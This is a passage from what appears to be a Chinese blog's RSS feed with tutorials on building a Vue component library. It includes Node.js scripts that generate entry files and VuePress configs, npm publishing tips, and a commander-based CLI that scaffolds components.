目录下的所有组件</p>
<div><pre><code>|-- build-entry.js
|
|-- get-components.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href="https://github.com/Eamonnzhang/vue-cards" target="_blank" rel="noopener noreferrer">vue-cards</a></p>
<p><code>build-entry.js</code></p>
<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs-extra"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>
<span>const</span> Components <span>=</span> <span>require</span><span>(</span><span>"./get-components"</span><span>)</span><span>(</span><span>)</span><span>;</span>
<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> config <span>=</span> <span>require</span><span>(</span><span>"../config"</span><span>)</span><span>;</span>

<span>function</span> <span>buildPackagesEntry</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> uninstallComponents <span>=</span> <span>[</span><span>]</span><span>;</span>

  <span>const</span> importList <span>=</span> Components<span>.</span><span>map</span><span>(</span>
    <span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span>import </span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span> from './</span><span><span>${</span>name<span>}</span></span><span>'</span><span>`</span></span>
  <span>)</span><span>;</span>
  <span>const</span> exportList <span>=</span> Components<span>.</span><span>map</span><span>(</span><span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>;</span>
  <span>const</span> intallList <span>=</span> exportList<span>.</span><span>filter</span><span>(</span>
    <span>(</span><span>name</span><span>)</span> <span>=></span> <span>!</span><span>~</span>uninstallComponents<span>.</span><span>indexOf</span><span>(</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>)</span>
  <span>)</span><span>;</span>
  <span>const</span> content <span>=</span> <span><span>`</span><span>import './assets/common.scss'
import './utils/filters'

</span><span><span>${</span>importList<span>.</span><span>join</span><span>(</span><span>"\n"</span><span>)</span><span>}</span></span><span>

const version = require('../package.json').version
const components = [
  </span><span><span>${</span>intallList<span>.</span><span>join</span><span>(</span><span>",\n  "</span><span>)</span><span>}</span></span><span>
]

const install = Vue => {
  if (install.installed) return
  components.map(component => Vue.component(component.name, component))
}

export {
  install,
  version,
  </span><span><span>${</span>exportList<span>.</span><span>join</span><span>(</span><span>",\n  "</span><span>)</span><span>}</span></span><span>
}

export default {
  install,
  version
}
</span><span>`</span></span><span>;</span>

  fs<span>.</span><span>writeFileSync</span><span>(</span>path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"../packages/index.js"</span><span>)</span><span>,</span> content<span>)</span><span>;</span>
  <span>log</span><span>(</span><span>"packages/index.js 文件已更新依赖"</span><span>)</span><span>;</span>
  <span>log</span><span>(</span><span>"exit"</span><span>)</span><span>;</span>
<span>}</span>

<span>function</span> <span>setDocsConfig</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> docsURL <span>=</span> <span>[</span><span>]</span><span>;</span>
  Components<span>.</span><span>forEach</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>
    docsURL<span>.</span><span>push</span><span>(</span><span><span>`</span><span>'/component/</span><span><span>${</span>item<span>}</span></span><span>'</span><span>`</span></span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
  <span>const</span> content <span>=</span> <span><span>`</span><span>const config = {
  dest: 'public',
  plugins: ['vue-demo'],
  serviceWorker: true,
  themeConfig: {
    sidebar: [
      ['/CHANGELOG', '更新日志'],
      ['/', '指南'], 
      {
        title: '组件',
        collapsable: false,
        children: [
          </span><span><span>${</span>docsURL<span>.</span><span>join</span><span>(</span><span>",\n          "</span><span>)</span><span>}</span></span><span>
        ]
      }
    ]
  },
  markdown: {
    lineNumbers: true
  },
  title: '</span><span><span>${</span>config<span>.</span>docsTitle<span>}</span></span><span>',
  base: '</span><span><span>${</span>config<span>.</span>base<span>}</span></span><span>'
}

module.exports = config
</span><span>`</span></span><span>;</span>

  fs<span>.</span><span>writeFileSync</span><span>(</span>
    path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"../docs/.vuepress/config.js"</span><span>)</span><span>,</span>
    content
  <span>)</span><span>;</span>
  <span>log</span><span>(</span><span>"packages/index.js 文件已更新依赖"</span><span>)</span><span>;</span>
  <span>log</span><span>(</span><span>"exit"</span><span>)</span><span>;</span>
<span>}</span>

<span>buildPackagesEntry</span><span>(</span><span>)</span><span>;</span>
<span>setDocsConfig</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>get-components.js</code></p>
<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>

<span>const</span> excludes <span>=</span> <span>[</span>
  <span>"index.js"</span><span>,</span>
  <span>"theme-chalk"</span><span>,</span>
  <span>"mixins"</span><span>,</span>
  <span>"utils"</span><span>,</span>
  <span>".DS_Store"</span><span>,</span>
  <span>"assets"</span><span>,</span>
<span>]</span><span>;</span>

module<span>.</span><span>exports</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>const</span> dirs <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>"../packages"</span><span>)</span><span>)</span><span>;</span>
  <span>return</span> dirs<span>.</span><span>filter</span><span>(</span><span>(</span><span>dirName</span><span>)</span> <span>=></span> excludes<span>.</span><span>indexOf</span><span>(</span>dirName<span>)</span> <span>===</span> <span>-</span><span>1</span><span>)</span><span>;</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="生成命令" tabindex="-1"> 生成命令</h3>
<p>在 <code>package.json</code> 中添加以下内容, 使用命令 <code>yarn new:comp</code> 创建组件目录及其文档或者使用命令 <code>yarn del:comp</code> 即可删除组件目录及其文档</p>
<div><pre><code><span>{</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"new:comp"</span><span>:</span> <span>"node scripts/create-comp.js &amp;&amp; node build/build-entry.js"</span><span>,</span>
    <span>"del:comp"</span><span>:</span> <span>"node scripts/delete-comp.js &amp;&amp; node build/build-entry.js"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h1 id="changelog" tabindex="-1"> changelog</h1>
<p>在 <code>package.json</code> 中修改 script 字段, 接下来你懂的, 另一篇博客有介绍哦, 小主可以执行搜索</p>
<div><pre><code><span>{</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"init"</span><span>:</span> <span>"npm install commitizen -g &amp;&amp; commitizen init cz-conventional-changelog --save-dev --save-exact &amp;&amp; npm run bootstrap"</span><span>,</span>
    <span>"bootstrap"</span><span>:</span> <span>"npm install"</span><span>,</span>
    <span>"changelog"</span><span>:</span> <span>"conventional-changelog -p angular -i docs/CHANGELOG.md -s -r 0"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="关于-pages-服务和发布至-npm" tabindex="-1"> 关于 pages 服务和发布至 npm</h2>
<h3 id="pages-服务" tabindex="-1"> pages 服务</h3>
<p>当然组件库以及文档完成之后, 都希望能够有个地址托管我们的组件文档, 这里比较推荐的是使用 <a href="https://gitee.com" target="_blank" rel="noopener noreferrer">Gitee</a> 中的项目 pages 服务</p>
<h3 id="发布至-npm" tabindex="-1"> 发布至 npm</h3>
<p>分情况而言</p>
<p>一是该组件库是公开的, 希望该组件库有较多的社区小伙伴能够一起维护的, 这里就比较推荐使用 <a href="https://github.com" target="_blank" rel="noopener noreferrer">GitHub</a>, 发布命令为 <code>npm publish</code> , 相关的 pages 服务可以参考本博客的托管机制(具体的还需要小主自行研究)</p>
<p>二是该组件库是是有的, 希望该组件库只是作为多个项目之间的共用 UI 框架, 这里比较推荐的是使用 <a href="https://gitee.com" target="_blank" rel="noopener noreferrer">Gitee</a>, 发布命令为 <code>npm publish</code> , 当然只是这样是不够的, 比较推荐的是使用 npm 私有库来托管我们的组件库(npm 私有库搭建请参考 <a href="/archives/693996ef.html">docker 使用指南-私有 npm 代理注册表</a>, 具体的还需要小主自行研究)</p>
<p>发布至私有库之前需要详细阅读这两篇文章: <a href="/archives/693996ef.html">docker 使用指南-私有 npm 代理注册表</a>, <a href="/archives/9a1dd005.html">Git 远程推送配置</a></p>
<h3 id="拓展" tabindex="-1"> 拓展</h3>
<p>可以定义无需发布的文将和目录</p>
<p>在项目目录下创建 <code>.npmignore</code></p>
<div><pre><code>*.js
.browserslistrc
.editorconfig
.npmrc
build/
docs/
scripts/
test/
public/
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>如果该组件库作为私有库发至私有 npm 代理库中, 建议在组件库项目以及依赖组件库的项目中创建 <code>.npmrc</code> , 注意这里的地址千万千万不能写 <code>127.0.0.1</code> 或者 <code>localhost</code> , 必须写成公网 IP 或者局域网 IP 或者域名, 否则在多人合作模式下则不能正确的发布或者下载</p>
<div><pre><code>registry=http://192.168.8.10:4873
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>使用 Vue cli 3.0 构建自定义组件库(第三弹)</title>
      <link>https://vxhly.github.io/views/vuejs/custom-component-library-third.html</link>
      <guid>https://vxhly.github.io/views/vuejs/custom-component-library-third.html</guid>
      <source url="https://vxhly.github.io/rss.xml">使用 Vue cli 3.0 构建自定义组件库(第三弹)</source>
      <description>前言
本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本和第二弹版本的小伙伴, 想必知道前两弹版本的多多少少存在着一些不足之处, 这一弹的版本为第二弹版本的升级版, 这个版本中我们将提供更多方便于操作的内容。

</description>
      <category>vuejs</category>
      <pubDate>Fri, 26 Jun 2020 10:57:54 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本和第二弹版本的小伙伴, 想必知道前两弹版本的多多少少存在着一些不足之处, 这一弹的版本为第二弹版本的升级版, 这个版本中我们将提供更多方便于操作的内容。</p>
</div>

<h2 id="前言" tabindex="-1"> 前言</h2>
<p><a href="/views/vuejs/custom-component-library-first.html">想看第一弹版本的小伙伴, 请戳我</a>, <a href="/views/vuejs/custom-component-library-second.html">想看第二弹版本的小伙伴, 请戳我</a></p>
<p>第三弹前期具备知识点</p>
<ul>
<li><a href="https://vuepress.vuejs.org/zh/" target="_blank" rel="noopener noreferrer">vuepress</a></li>
<li><a href="https://cli.vuejs.org/zh/" target="_blank" rel="noopener noreferrer">Vue CLI</a></li>
<li><a href="https://docs.docker.com/docker-hub/" target="_blank" rel="noopener noreferrer">Docker</a></li>
</ul>
<h2 id="前置工作" tabindex="-1"> 前置工作</h2>
<p>以下工作全部基于 Vue CLI 4.x, 所以首先要保证机子上有 <code>@vue/cli</code></p>
<div><pre><code>vue create vtp-ui <span># vtp-ui 作为教学的库名</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>dart-sass</code> , <code>babel</code> , <code>eslint</code> 这些是该项目使用的依赖项, 小主可以根据自己的需求进行相应的切换</p>
<h2 id="start" tabindex="-1"> start</h2>
<p>开始造轮子了, 以下示例代码 <a href="https://github.com/vxhly/vtp-ui" target="_blank" rel="noopener noreferrer">请戳这里</a></p>
<h2 id="工作目录" tabindex="-1"> 工作目录</h2>
<p>默认生成的 src 目录以及 public 目录在该项目下是没有作用的, 小主可以删掉了, 这么做的主要目的当然只是保留生成的 <code>package.json</code> 文件</p>
<p>调整项目目录如下, 其中 BAT_SCRIPT 文件夹用来存放 windwos 下使用 <code>forever</code> 启动 npm 私有代理的脚本, DOCKER 文件夹用来存放有 <code>docker</code> 环境下启动 npm 私有代理的脚本, docs 文件夹则是 vuepress 的主体部分了, 其中 .vuepress 是用来存放 vuepress 相关的配置文件, 而组件文档则放置在 docs 的根目录, packages 文件夹是用来存放组件的核心代码, vtp-cli 文件夹则是用来存放自定义的组件库中的组件文件以及相应文档生成的 cli 工具</p>
<p>大致的目录结构如下：</p>
<div><pre><code>|-- BAT_SCRIPT
|
|-- DOCKER
|
|-- docs
    |-- .vuepress
        |-- config.js
        |-- enhanceApp.js
    |-- README.md
|
|-- vtp-cli
|
|-- packages
|   |-- index.js
|
|-- .npmrm
|
|-- .npmignore
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="添加编译脚本" tabindex="-1"> 添加编译脚本</h2>
<div><p>注意</p>
<p><code>core-js</code> 库需要采用的 2.6.5 这个版本, 高于这个版本的可能会导致开启文档失败</p>
</div>
<p><code>package.json</code> 其中的组件 name 推荐和创建的项目名一致</p>
<div><pre><code><span>{</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"build:lib"</span><span>:</span> <span>"vue-cli-service build --target lib --name vtp-ui --dest lib packages/index.js"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>修改 main 主入口文件</p>
<div><pre><code><span>{</span>
  <span>"main"</span><span>:</span> <span>"lib/vtp-ui.common.js"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="一个组件例子" tabindex="-1"> 一个组件例子</h2>
<h3 id="vuepress-进阶配置" tabindex="-1"> vuepress 进阶配置</h3>
<p><code>.vuepress/config.js</code></p>
<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> baseDir <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>"../base"</span><span>)</span><span>)</span><span>;</span>
<span>const</span> businessDir <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>"../business"</span><span>)</span><span>)</span><span>;</span>

<span>const</span> config <span>=</span> <span>{</span>
  <span>dest</span><span>:</span> <span>"public"</span><span>,</span>
  <span>plugins</span><span>:</span> <span>[</span><span>"vue-demo"</span><span>,</span> <span>require</span><span>(</span><span>"./plugins/clipboard-copy"</span><span>)</span><span>]</span><span>,</span>
  <span>serviceWorker</span><span>:</span> <span>true</span><span>,</span>
  <span>themeConfig</span><span>:</span> <span>{</span>
    <span>sidebar</span><span>:</span> <span>[</span>
      <span>[</span><span>"/Guide"</span><span>,</span> <span>"指南"</span><span>]</span><span>,</span>
      <span>{</span>
        <span>title</span><span>:</span> <span>"普通组件"</span><span>,</span>
        <span>collapsable</span><span>:</span> <span>false</span><span>,</span>
        <span>children</span><span>:</span> <span>[</span>
          <span>...</span>baseDir<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span><span>`</span><span>/base/</span><span><span>${</span>item<span>.</span><span>replace</span><span>(</span><span>".md"</span><span>,</span> <span>""</span><span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>title</span><span>:</span> <span>"业务组件"</span><span>,</span>
        <span>collapsable</span><span>:</span> <span>false</span><span>,</span>
        <span>children</span><span>:</span> <span>[</span>
          <span>...</span>businessDir<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span><span>`</span><span>/business/</span><span><span>${</span>item<span>.</span><span>replace</span><span>(</span><span>".md"</span><span>,</span> <span>""</span><span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>
  <span>markdown</span><span>:</span> <span>{</span>
    <span>lineNumbers</span><span>:</span> <span>true</span><span>,</span>
    <span>extendMarkdown</span><span>:</span> <span>(</span><span>md</span><span>)</span> <span>=></span> <span>{</span>
      <span>// 使用 markdown-it-vuese 自动生成组件</span>
      md<span>.</span><span>use</span><span>(</span><span>require</span><span>(</span><span>"markdown-it-vuese"</span><span>)</span><span>,</span> <span>{</span>
        <span>vueseRe</span><span>:</span> <span><span>/</span><span>&lt;\[vuese-h3\]\((.+)\)</span><span>/</span><span>i</span></span><span>,</span>
        <span>ruleName</span><span>:</span> <span>"vuese-h3"</span><span>,</span>
        <span>useRender</span><span>:</span> <span>(</span><span>vueseRender</span><span>)</span> <span>=></span> <span>{</span>
          <span>const</span> renderRes <span>=</span> vueseRender<span>.</span><span>render</span><span>(</span><span>)</span><span>;</span>
          <span>const</span> <span>genMd</span> <span>=</span> <span>(</span><span>key</span><span>)</span> <span>=></span> <span><span>`</span><span>### </span><span><span>${</span>key<span>}</span></span><span>\n</span><span><span>${</span>renderRes<span>[</span>key<span>]</span><span>}</span></span><span>\n</span><span>`</span></span><span>;</span>
          <span>return</span> Object<span>.</span><span>keys</span><span>(</span>renderRes<span>)</span><span>.</span><span>map</span><span>(</span>genMd<span>)</span><span>.</span><span>join</span><span>(</span><span>""</span><span>)</span><span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>title</span><span>:</span> <span>"vtp-ui"</span><span>,</span>
  <span>base</span><span>:</span> <span>"/vtp-ui"</span><span>,</span>
  <span>chainWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>,</span>
<span>}</span><span>;</span>

module<span>.</span>exports <span>=</span> config<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>重点</p>
<p>在做组件库时, 有可能出现 <code>windows</code>、<code>document</code> 未能找到问题, 可以参考以下文章进行配置</p>
<p><a href="https://segmentfault.com/a/1190000022727986" target="_blank" rel="noopener noreferrer">VuePress window document is not defined</a></p>
</div>
<h3 id="cli-工具" tabindex="-1"> CLI 工具</h3>
<div><p>提示</p>
<p>这才是本弹的重点, 其他内容小主可自主查阅示例代码</p>
</div>
<p><code>vtp-cli/bin/vtp-cli.js</code></p>
<div><pre><code><span>#! /usr/bin/env node</span>

<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs"</span><span>)</span><span>;</span>
<span>const</span> <span>{</span> version <span>}</span> <span>=</span> <span>require</span><span>(</span><span>"../package.json"</span><span>)</span><span>;</span>
<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> program <span>=</span> <span>require</span><span>(</span><span>"commander"</span><span>)</span><span>;</span>
<span>const</span> initPackage <span>=</span> <span>require</span><span>(</span><span>"./vtp-new"</span><span>)</span><span>;</span>
<span>const</span> delPackage <span>=</span> <span>require</span><span>(</span><span>"./vtp-del"</span><span>)</span><span>;</span>

<span>const</span> <span>VUPRESS_DIR</span> <span>=</span> <span>"docs/.vuepress"</span><span>;</span>

<span>const</span> isProject <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span><span>VUPRESS_DIR</span><span>)</span><span>;</span>

<span>if</span> <span>(</span>isProject<span>)</span> <span>{</span>
  program
    <span>.</span><span>version</span><span>(</span>version<span>)</span>
    <span>.</span><span>usage</span><span>(</span><span>"[options]"</span><span>)</span>
    <span>.</span><span>description</span><span>(</span><span>"运行命令来为你的组件库新增或者删除组件。"</span><span>)</span><span>;</span>

  program<span>.</span><span>command</span><span>(</span><span>"new"</span><span>)</span><span>.</span><span>description</span><span>(</span><span>"创建一个组件"</span><span>)</span><span>.</span><span>action</span><span>(</span>initPackage<span>)</span><span>;</span>

  program<span>.</span><span>command</span><span>(</span><span>"del"</span><span>)</span><span>.</span><span>description</span><span>(</span><span>"删除一个组件"</span><span>)</span><span>.</span><span>action</span><span>(</span>delPackage<span>)</span><span>;</span>
  program<span>.</span><span>parse</span><span>(</span>process<span>.</span>argv<span>)</span><span>;</span>
<span>}</span> <span>else</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span>"非常抱歉！当前的项目目录非组件库目录。"</span><span>)</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>vtp-cli/bin/vtp-new.js</code></p>
<div><pre><code><span>#! /usr/bin/env node</span>

<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> uppercamelcase <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>

<span>const</span> mkdirs <span>=</span> <span>require</span><span>(</span><span>"./utils/mkdirs"</span><span>)</span><span>;</span>
<span>const</span> copyFile <span>=</span> <span>require</span><span>(</span><span>"./utils/file"</span><span>)</span><span>;</span>
<span>const</span> newHandleInquirer <span>=</span> <span>require</span><span>(</span><span>"./inquirer/new-inquier"</span><span>)</span><span>;</span>

<span>const</span> <span>PACKAGES_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span>process<span>.</span><span>cwd</span><span>(</span><span>)</span><span>}</span></span><span>/packages</span><span>`</span></span><span>;</span>
<span>const</span> <span>CSS_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/theme-chalk</span><span>`</span></span><span>;</span>
<span>const</span> <span>DOCS_DIR</span> <span>=</span> <span>"docs"</span><span>;</span>

<span>const</span> <span>initPackage</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>newHandleInquirer</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>choices</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> compoenntName<span>,</span> compoenntType <span>}</span> <span>=</span> choices<span>;</span>
    <span>const</span> <span>PACKAGE_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/</span><span><span>${</span>compoenntName<span>}</span></span><span>`</span></span><span>;</span>
    <span>const</span> <span>PACKAGE_DOCS_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>DOCS_DIR</span><span>}</span></span><span>/</span><span><span>${</span>compoenntType<span>}</span></span><span>`</span></span><span>;</span>
    <span>mkdirs</span><span>(</span><span>PACKAGE_DIR</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>copyFile</span><span>(</span>
        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"/tmp"</span><span>)</span><span>,</span>
        <span>PACKAGE_DIR</span><span>,</span>
        <span>"entry.js.tmp"</span><span>,</span>
        <span>"index.js"</span><span>,</span>
        choices
      <span>)</span><span>;</span>
      <span>copyFile</span><span>(</span>
        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"/tmp"</span><span>)</span><span>,</span>
        <span>PACKAGE_DIR</span><span>,</span>
        <span>"entry.vue.tmp"</span><span>,</span>
        <span><span>`</span><span><span>${</span><span>uppercamelcase</span><span>(</span>compoenntName<span>)</span><span>}</span></span><span>.vue</span><span>`</span></span><span>,</span>
        choices
      <span>)</span><span>;</span>
      <span>copyFile</span><span>(</span>
        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"/tmp"</span><span>)</span><span>,</span>
        <span>PACKAGE_DOCS_DIR</span><span>,</span>
        <span>"entry.md.tmp"</span><span>,</span>
        <span><span>`</span><span><span>${</span><span>uppercamelcase</span><span>(</span>compoenntName<span>)</span><span>}</span></span><span>.md</span><span>`</span></span><span>,</span>
        choices
      <span>)</span><span>;</span>
      <span>copyFile</span><span>(</span>
        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"/tmp"</span><span>)</span><span>,</span>
        <span>CSS_DIR</span><span>,</span>
        <span>"entry.scss.tmp"</span><span>,</span>
        <span><span>`</span><span><span>${</span>compoenntName<span>}</span></span><span>.scss</span><span>`</span></span><span>,</span>
        choices
      <span>)</span><span>;</span>
      <span>copyFile</span><span>(</span>
        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"/tmp"</span><span>)</span><span>,</span>
        <span>CSS_DIR</span><span>,</span>
        <span>"entry.css.tmp"</span><span>,</span>
        <span><span>`</span><span><span>${</span>compoenntName<span>}</span></span><span>.css</span><span>`</span></span><span>,</span>
        choices
      <span>)</span><span>;</span>
      <span>// copyFile(path.join(__dirname, '/tmp'), CSS_DIR, 'entry.min.css.tmp', `${compoenntName}.min.css` , choices)</span>
      <span>copyFile</span><span>(</span>
        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"/tmp"</span><span>)</span><span>,</span>
        <span>PACKAGES_DIR</span><span>,</span>
        <span>"export.js.tmp"</span><span>,</span>
        <span>"index.js"</span><span>,</span>
        choices
      <span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span><span>;</span>

module<span>.</span>exports <span>=</span> initPackage<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>vtp-cli/bin/vtp-del.js</code></p>
<div><pre><code><span>#! /usr/bin/env node</span>

<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> uppercamelcase <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>

<span>const</span> delHandleInquirer <span>=</span> <span>require</span><span>(</span><span>"./inquirer/del-inquirer.js"</span><span>)</span><span>;</span>
<span>const</span> copyFile <span>=</span> <span>require</span><span>(</span><span>"./utils/file"</span><span>)</span><span>;</span>

<span>const</span> <span>PACKAGES_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span>process<span>.</span><span>cwd</span><span>(</span><span>)</span><span>}</span></span><span>/packages</span><span>`</span></span><span>;</span>
<span>const</span> <span>DOCS_DIR</span> <span>=</span> <span>"docs"</span><span>;</span>
<span>const</span> <span>CSS_DIRECTORY</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/theme-chalk</span><span>`</span></span><span>;</span>
<span>const</span> <span>removePromise</span> <span>=</span> <span>(</span><span>dir</span><span>)</span> <span>=></span> <span>{</span>
